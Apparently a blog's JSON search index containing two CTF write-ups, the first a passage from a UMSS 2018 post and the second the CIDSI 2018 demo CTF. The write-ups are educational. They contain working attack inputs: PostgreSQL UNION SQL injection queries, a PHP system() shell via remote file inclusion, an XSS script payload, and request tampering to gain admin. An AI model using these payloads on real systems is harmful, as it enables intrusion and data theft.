atob(_0x9045[5])){alert(_0x9045[6]);window[_0x9045[7]]= _0x9045[8];return false}else {attempt--;alert(_0x9045[9]+ attempt+ _0x9045[10]);if(attempt== 0){document[_0x9045[2]](_0x9045[1])[_0x9045[11]]= true;document[_0x9045[2]](_0x9045[3])[_0x9045[11]]= true;document[_0x9045[2]](_0x9045[12])[_0x9045[11]]= true;return false}}} However it is obfuscated, we can search many sites online to plain it and have it more understandable:\nvar attempt = 3; function validate() { var _0xd22bx3 = document[\u0026#39;getElementById\u0026#39;](\u0026#39;username\u0026#39;)[\u0026#39;value\u0026#39;]; var _0xd22bx4 = document[\u0026#39;getElementById\u0026#39;](\u0026#39;password\u0026#39;)[\u0026#39;value\u0026#39;]; if (_0xd22bx3 == \u0026#39;EHC\u0026#39; \u0026amp;\u0026amp; _0xd22bx4 == atob(\u0026#39;M3RoaWM0bF9oNGNrMW5n\u0026#39;)) { alert(\u0026#39;FLAG encontrada!!, ingresa el flag en el formato flag{....}\u0026#39;); window[\u0026#39;location\u0026#39;] = \u0026#39;index.html\u0026#39;; return false } else { attempt--; alert(\u0026#39;You have left \u0026#39; + attempt + \u0026#39; attempt;\u0026#39;); if (attempt == 0) { document[\u0026#39;getElementById\u0026#39;](\u0026#39;username\u0026#39;)[\u0026#39;disabled\u0026#39;] = true; document[\u0026#39;getElementById\u0026#39;](\u0026#39;password\u0026#39;)[\u0026#39;disabled\u0026#39;] = true; document[\u0026#39;getElementById\u0026#39;](\u0026#39;submit\u0026#39;)[\u0026#39;disabled\u0026#39;] = true; return false } } } We can analyze that the username is: EHC, and the password is hidden in Base64(atob ): 3thic4l_h4ck1ng. Then the login tells us that the flag is the password with the format flag {...} :\nflag{3thic4l_h4ck1ng} 3.- file_5e9666c7a0773f3785123f19986b4c5f\nthey give us a text file, which contains the following As we can see, it is a hexdump, we can reverse it with xxd:\nxxd -r file_5e9666c7a0773f3785123f19986b4c5f \u0026gt; myfile which gives us an image:\nand directly gives us the flag\nflag{FL4g_Facil_o_Difici1} 4.- SQLi\nwell\u0026hellip; he gave us a login with google captcha. I really hated this challenge and also my team, thanks @crhystamil :) hehehe, but let\u0026rsquo;s continue. Clearly it was about doing a SQL injection, however we tried with the typical admin:admin which gave us an answer of Buen_Intento_Pero_EsteNo_esEl_Flag, with this we could deduce that it was a valid user but not the one we want.\nAfter several attempts with MySql statements \u0026hellip; I tried Postgres with admin as password, to fulfill a valid query of course.\n-\u0026#39; UNION ALL SELECT NULL,NULL,current_database(),NULL-- It responds with ctf :D\nNow we continue trying to call the existing tables.\n-\u0026#39; UNION ALL SELECT NULL,NULL,table_name,NULL FROM information_schema.tables LIMIT 1 OFFSET 0-- response: users\nLuckily, the table we want skips on the first try, however, it does not allow us to make requests directly, but rather by encoding it.\nusers =\u0026gt; CHR(117)||CHR(115)||CHR(101)||CHR(114)||CHR(115) Which would be based on ASCII .\nIt would look something like this:\n-\u0026#39; UNION ALL SELECT NULL,NULL,column_name,NULL FROM information_schema.columns where table_name=CHR(117)||CHR(115)||CHR(101)||CHR(114)||CHR(115) LIMIT 1 OFFSET 0-- In the response we are enumerating increasing the OFFSET. Columns that can be useful to us:id, users,pass, flag. Now, we are only one step away from achieving it,however\u0026hellip;\n-\u0026#39; UNION ALL SELECT NULL,NULL,flag,NULL FROM ctf.public.users LIMIT 1 OFFSET 29-- The answer was until the 29th attempt, again, thanks @crhystamil .\nThe flag:\nDJC{Buen_Intento_esEl_Flag} 5.- Beware of running everything\nin this case it gives us a host in which it is executing even the images it has, which is obviously a bad practice, it gives us an open door to a RFI . From a remote server we try to locate the flag with a quick shell.\n\u0026lt;?php system(‚Äòls‚Äô); ?\u0026gt; This shows us the files in the current directory, in which there was a file that when read it gave us the flag just changing the URL for the file that contains it.\n-2s3d5f6g7g549fy4nfp734lk37-\nThe flag:\nflag{3hc_gr0up_h4ck1ng_Dragonjar} 6.- firmware analysis\nHe give us an image to analyze:open-hacking_151b4da179e4163e7e879da22e0c76e2.bin\nWhich we can use to extract the files they contain with Binwalk\nbinwalk -Me open-hacking_151b4da179e4163e7e879da22e0c76e2.bin So we can parse it and we get the flag:\nbandera{43320192606d672bf0db1280026c799902f03bdd} I think that would be :D However this are not all the problems, we could not complete them :( But and thanks to @crhystamil ! for build this fun CTF :D\nthe next write up is from CIDSI!\n-Hackers are People Too üòú\nSeries links The previous WriteUp(CIDSI Demo WriteUp ) WriteUp CTF CIDSI18 ","permalink":"http://localhost/post/writeup-ctfumss18/","tags":[{"LinkTitle":"CTF","RelPermalink":"/tags/ctf/"},{"LinkTitle":"WriteUp","RelPermalink":"/tags/writeup/"}],"title":"Write Up CTF UMSS 2018"},{"categories":[],"content":"Hey there!\nThis is the first post in a series covering CTF challenges held during the International Congress on Information Security (CIDSI), organized by the Agency for Electronic Government and Information and Communication Technologies (AGETIC), thanks to the efforts of the Cyber Incident Management Center (CGII). The event took place from November 29 to December 1, 2018.\nWe\u0026rsquo;ll start with the demo CTF challenge organized by CGII.\n1. Submit the flag\nThis is a simple challenge meant to demonstrate how the platform works.\nAll you need to do is submit the flag. The flag is: 327a6c4304ad5938eaf0efb6cc3e53dc\nSolution: The challenge literally gives you the flag:\n327a6c4304ad5938eaf0efb6cc3e53dc 2. Website\nNow it gets slightly more ‚Äúdifficult.‚Äù A developer from AGETIC left a hint on the event‚Äôs website. Link: https://www.cgii.gob.bo/eventos/cidsi2018/ Solution: Inspect the page‚Äôs source code using F12 or Ctrl+U.\nAnd there it is:\n8ddeb2027a8c79b3c46510a6dcef9dda 3. Admin Panel\nPoor security configurations.\nDevelopers often use default or easy-to-guess passwords.\nYou‚Äôre starting to explore your hacking skills and while visiting a company, you connect to their internal network. Surprise! You find the admin panel for their employee system. Your mission: log in as admin and get the flag.\nSolution: There are many common/default credentials (check this list ).\nLet‚Äôs try the classic: admin/admin\nNice! Here\u0026rsquo;s the flag:\n58FD79FEF76B8D579819C5FA615A25930F111C04627C3F374C5D7DF898A5FEADE1598AA0680BDF5B922ACBE396691FD1943A181E362F32FFCC0B29A6DD725BA0 4. Cracking\nCracking the hash\nMD5 is no longer considered secure.\nA hacker friend doing a security assessment got access to a user database. If he can break a hash and log in, he‚Äôll gain more privileges. Help him crack this outdated hash: 3cc31cd246149aec68079241e71e98f6\nSolution: Google the hash ‚Äî luckily, it‚Äôs been indexed. Tools like Hashcat or John The Ripper could help too.\nPa$$w0rd 5. Cracking 2\nYou‚Äôre chilling in a five-star hotel. A friend captures network traffic with Wireshark and happens to sniff a login to a staff portal with hotel promotions. The password looks ‚Äúencrypted‚Äù ‚Äî but you‚Äôve got this. The hash: ODcwMzM2NzA5ODUwMDUzNA==\nSolution: Looks like Base64. Tools to detect encodings are easy to find online.\nThe flag is:\n8703367098500534 6. Cracking 3\nWhile capturing traffic, you find what looks like a hash: MNQXA4TJMNXXE3TJN4======\nMission: decode it.\nHint: It‚Äôs ‚Äúhalf as hard‚Äù as Base64.\nSolution: The hint points to Base32. The flag is:\ncapricornio 7. Cracking 4\nA friend missed their first crypto class in a security postgrad course and needs help decoding this: ynivqnrftravny\nHint: If today were ‚ÄúTuesday the 13th,‚Äù things would be easier.\nSolution: This is a reference to ROT13 . Use any ROT13 decoder.\nThe flag:\nlavidaesgenial 8. Find user\nDevelopers often forget to sanitize user input.\nWe found a site that offers VIP invites to exclusive events. To access them, you need to trigger a JavaScript alert. Can you do it? If you‚Äôre the dev pro we think you are, the flag will be your reward.\nSolution: This suggests a basic XSS . Try something like:\n\u0026lt;script\u0026gt;alert(\u0026#34;XSS\u0026#34;)\u0026lt;/script\u0026gt; And voil√†!\nFollowed by:\nThe flag:\n11B0C9EBB6D5A0E0E4AE5B1F604B9E8111FEDF991173667AEB2D14F91ACC3B62FB6A5FD4E9AF37BAF09932150BF0D89A3B89F2B9F135347799D95DB38A4AC515 9. View profile\nProgressing nicely! A chocolate company is giving away chocolates to random users. To see the list, you need admin rights. Currently, you‚Äôre just a tech user. Your mission: gain access to the admin profile. Your reward? Chocolate ‚Äî and the flag, which is the admin‚Äôs contact info.\nSolution: Check the request headers when clicking ‚ÄúUpdate profile‚Äù:\nPOST /eventos/cidsi2018/ctfdemo/lessons/fdb94122d0f032821019c7edf09dc62ea21e25ca619ed9107bcc50e4a8dbc100 HTTP/1.1 Host: www.cgii.gob.bo Content-Type: application/x-www-form-urlencoded username=tecnico Change the username to:\nusername=administrador And there‚Äôs your flag:\nE762A4B454B64E50ED992465C1FBD424A5FB7184E9AA89B901D9ACD9B311AB3D927647D3BBC1BC52BDDEC560A005F72638F2C69D0D60169EBF621ABE8BF14A74 As we‚Äôd say in Bolivia\u0026hellip; esito ser√≠a. More write-ups will be published and linked soon. Stay tuned!\nHackers are People Too üòú\nSeries links\nCTF UMSS Write-Up CIDSI18 CTF Write-Up ","permalink":"http://localhost/post/writeup-democidsi18/","tags":[{"LinkTitle":"CTF","RelPermalink":"/tags/ctf/"},{"LinkTitle":"WriteUp","RelPermalink":"/tags/writeup/"}],"title":"Write-Up: CIDSI 2018 Demo CTF"},{"categories":[],"content":"","permalink":"http://localhost/manifest.json","tags":[],"title":""},{"categories":[],"content":"","permalink":"http://localhost/search/_index.de/","tags":[],"title":""},{"categories":[],"content":"","permalink":"http://localhost/search/_index.es/","tags":[],"title":""},{"categories":[],"content":"","permalink":"http://localhost/search/_index.fr/","tags":[],"title":""},{"categories":[],"content":"","permalink":"http://localhost/search/_index.hi/","tags":[],"title":""},{"categories":[],"content":"","permalink":"http://localhost/search/_index.jp/","tags":[],"title":""},{"categories":[],"content":"","permalink":"http://localhost/search/_index.nl/","tags":[],"title":""},{"categories":[],"content":"","permalink":"http://localhost/search/_index.pl/","tags":[],"title":""},{"categories":[],"content":"","permalink":"http://localhost/search/_index.ru/","tags":[],"title":""},{"categories":[],"content":"","permalink":"http://localhost/search/_index.zh-cn/","tags":[],"title":""},{"categories":[],"content":"","permalink":"http://localhost/tags/custom/custom/","tags":[],"title":"Tags Personalizados"},{"categories":[],"content":"","permalink":"http://localhost/categories/with-slug/with-slug/","tags":[],"title":"Ëá™ÂÆö‰πâ Slug ÁöÑÂàÜÁ±ª"}]